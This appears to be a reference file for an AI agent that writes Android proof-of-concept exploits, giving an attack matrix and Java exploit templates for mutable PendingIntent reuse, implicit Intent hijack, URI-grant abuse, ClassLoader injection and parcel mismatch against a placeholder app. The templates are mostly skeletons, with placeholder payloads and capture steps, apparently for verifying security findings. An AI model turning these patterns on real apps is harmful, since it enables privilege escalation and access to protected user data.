---
name: poc-app-intent
description: Intent PoC reference covering mutable PendingIntent abuse, URI-grant abuse, implicit Intent hijack, ClassLoader injection, and parcel mismatch.
---

# Intent PoC Reference

Use this reference for handle reuse, grant forwarding, or serialization-driven Intent attacks. Intent PoCs usually fit `returned-handle` or `interception` mode.

## Construction Matrix

| Vulnerability | Exploit mode | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| mutable `PendingIntent` abuse | `returned-handle` | capture step if needed | victim-identity action runs |
| URI-grant abuse | `interception` or `returned-handle` | helper activity/receiver if grant must be intercepted | protected `content://` URI becomes readable or writable |
| implicit Intent hijack | `interception` | helper component in Manifest | payload or workflow is intercepted |
| ClassLoader injection | advanced `direct-trigger` | custom payload class | unsafe deserialization path accepts crafted object |
| parcel mismatch | advanced `direct-trigger` | custom parcel builder | validation path and execution path diverge |

## Pattern 1 - Returned Handle Reuse

Use for `IntentPendingIntentEscalationExploit`.

```java
public final class IntentPendingIntentEscalationExploit extends Exploit {
    public IntentPendingIntentEscalationExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        PendingIntent pendingIntent = obtainTargetPendingIntent();
        if (pendingIntent == null) {
            log("Could not obtain target PendingIntent");
            return;
        }

        Intent fillIntent = new Intent();
        fillIntent.setClassName("com.target", "com.target.PrivilegedActivity");
        fillIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        try {
            pendingIntent.send(context, 0, fillIntent);
            log("Reused mutable PendingIntent with attacker-filled target");
        } catch (Exception e) {
            log("PendingIntent send failed: " + e.getMessage());
        }
    }

    private PendingIntent obtainTargetPendingIntent() {
        return null;
    }
}
```

Common acquisition sources:

- notification action
- app widget template
- IPC return value
- provider result or activity extra

Do not invent a capture step that the verified finding never proved.

## Pattern 2 - Grant or Implicit-Intent Interception

Use for `IntentUriPermissionExploit` or `IntentImplicitHijackExploit`.

```java
public final class IntentImplicitHijackExploit extends Exploit {
    public IntentImplicitHijackExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent trigger = new Intent("com.target.TRIGGER_ACTION");
        context.sendBroadcast(trigger);
        log("Triggered flow that should emit an implicit Intent");
    }
}
```

Manifest support:

- add a helper activity, receiver, or service with the matching `intent-filter`
- add only the exact action, data scheme, and category required to capture the target flow

Success signal:

- captured implicit payload
- captured grant-bearing `content://` URI

## Pattern 3 - Advanced Serialization Path

Use for `IntentClassloaderInjectExploit`.

```java
public final class IntentClassloaderInjectExploit extends Exploit {
    public IntentClassloaderInjectExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.DeserializeActivity");
        // Replace with a real payload object only if the verified finding
        // proves the target ClassLoader will resolve it.
        log("Prepare a payload class only after confirming the exact deserialization path.");
        context.startActivity(intent);
    }
}
```

Construction rule:

- do not mark this PoC `build-ready` if the payload class still depends on unstated assumptions

## Pattern 4 - Advanced Parcel Mismatch

Use for `IntentParcelMismatchExploit`.

```java
public final class IntentParcelMismatchExploit extends Exploit {
    public IntentParcelMismatchExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.IntentProcessingActivity");
        Bundle bundle = new Bundle();
        intent.putExtra("extra_bundle", bundle);
        context.startActivity(intent);
        log("Replace the placeholder Bundle with a real crafted parcel only after the mismatch shape is verified.");
    }
}
```

Construction rule:

- treat parcel mismatch as high-cost and exact-shape dependent
- do not overclaim compile or runtime readiness if the crafted parcel is not actually implemented
